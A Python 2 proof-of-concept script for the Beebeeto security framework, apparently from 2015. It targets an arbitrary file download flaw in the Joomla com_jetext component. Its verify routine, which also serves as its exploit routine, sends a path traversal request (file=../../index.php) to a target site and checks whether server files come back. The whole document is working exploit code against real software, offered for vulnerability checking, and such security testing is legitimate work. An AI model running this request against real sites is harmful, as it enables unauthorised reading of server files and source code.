#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0142',
            'name': 'Joomla /index.php 任意文件下载漏洞 POC',
            'author': 'ximumu',
            'create_date': '2015-10-05',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Joomla',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['Joomla', '/index.php', 'com_jetext', 'Arbitrary File Download'],
            'desc': '''
                    /index.php 文件用于文件下载，/index.php?option=com_jetext&task=download&
                    file=[../../index.php] 其中file参数未做正确过滤限制,导致可下载任意文件
                    ''',
            'references': ['https://www.bugscan.net/#!/x/22738',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/index.php?option=com_jetext&task=download&file=../../index.php"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if 'Id: index.php' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())